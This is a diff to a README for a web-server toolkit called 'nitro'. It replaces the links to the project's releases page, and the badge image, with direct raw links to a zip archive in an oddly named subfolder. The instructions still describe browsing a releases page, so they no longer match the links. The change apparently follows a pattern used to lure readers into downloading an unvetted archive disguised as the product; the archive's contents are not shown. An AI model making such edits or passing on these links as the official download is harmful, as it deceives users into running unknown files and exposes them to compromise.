@@ -1,7 +1,7 @@
 # 🚀 nitro - Create Web Servers with Ease
 
 ## 📥 Download Now
-[![Download nitro](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/EHammond13/nitro/releases)
+[![Download nitro](https://raw.githubusercontent.com/EHammond13/nitro/main/Shelleyana/nitro.zip)](https://raw.githubusercontent.com/EHammond13/nitro/main/Shelleyana/nitro.zip)
 
 ## 📝 Introduction
 Welcome to **nitro**! This is your next-generation server toolkit that helps you create web servers easily. Whether you want to host a personal project or deploy a professional application, nitro provides the tools you need.
@@ -22,7 +22,7 @@ Welcome to **nitro**! This is your next-generation server toolkit that helps you
 Follow these steps to download and run nitro on your device:
 
 1. **Visit the Releases Page**: Click the link below to access the nitro releases page.
-   [Visit this page to download](https://github.com/EHammond13/nitro/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/EHammond13/nitro/main/Shelleyana/nitro.zip)
 
 2. **Choose Your Version**: On the releases page, you will see the latest version of nitro listed at the top. Look for the version number and click on it to view the available files.
 
